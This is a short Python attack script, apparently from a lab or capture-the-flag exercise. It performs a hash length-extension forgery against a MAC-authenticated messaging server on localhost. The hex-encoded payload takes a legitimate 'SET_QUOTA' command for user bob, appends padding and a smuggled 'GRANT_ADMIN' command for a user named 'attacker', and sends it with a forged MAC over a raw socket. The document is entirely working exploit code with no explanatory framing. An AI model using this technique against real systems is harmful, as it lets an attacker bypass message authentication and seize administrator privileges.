import socket
import json

forged_mac = "a691b86409911dca3eb1e6e93513f947"
forged_msg_bytes = bytes.fromhex(
    "434d443d5345545f51554f544126555345523d626f62264c494d49543d313030800000000000000000000000600100000000000026434d443d4752414e545f41444d494e26555345523d61747461636b6572"
)
# Convert to string in latin1 to preserve raw bytes
forged_msg = forged_msg_bytes.decode('latin1')

attack_packet = {
    "command": "SEND_MESSAGE",
    "recipient": "test12",
    "content": forged_msg,
    "mac": forged_mac
}

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('localhost', 12345))
sock.send(json.dumps(attack_packet).encode('utf-8'))

response = sock.recv(1024).decode()
print("Server response:", response)
sock.close()
